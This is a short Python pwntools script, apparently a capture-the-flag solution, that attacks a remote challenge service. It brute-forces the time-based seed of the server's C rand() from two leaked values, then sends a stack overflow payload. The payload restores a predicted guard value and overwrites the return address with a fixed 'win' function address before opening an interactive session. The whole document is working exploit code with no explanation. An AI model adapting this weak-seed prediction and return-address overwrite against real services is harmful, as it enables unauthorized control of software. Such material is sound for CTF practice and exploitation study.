from pwn import *
from ctypes import CDLL

win_addr = 0x4012B6
libc = CDLL("libc.so.6")

p = remote("amt.rs", 31175)
t = libc.time(0)


libc.srand(t)
glob = 0

p.sendline(b"1")
p.recvuntil(b"3) Exit\n")
s1 = int(p.recvline().strip(), 10)
p.sendline(b"1")
p.recvuntil(b"3) Exit\n")
s2 = int(p.recvline().strip(), 10)

for i in range(t, t+200):
    print("tried seed " + str(i))
    libc.srand(i)
    glob = libc.rand()
    t1 = libc.rand()
    t2 = libc.rand()
    if (s1 == t1 and s2 == t2):
        print("seed is " + str(i))
        break

payload = str(t1).encode() + b"a"*(0x30-len(str(t1))-4) + p32(glob) + b"a"*8 + p64(win_addr)

p.sendline(b"2")
p.sendline(payload)

p.interactive()

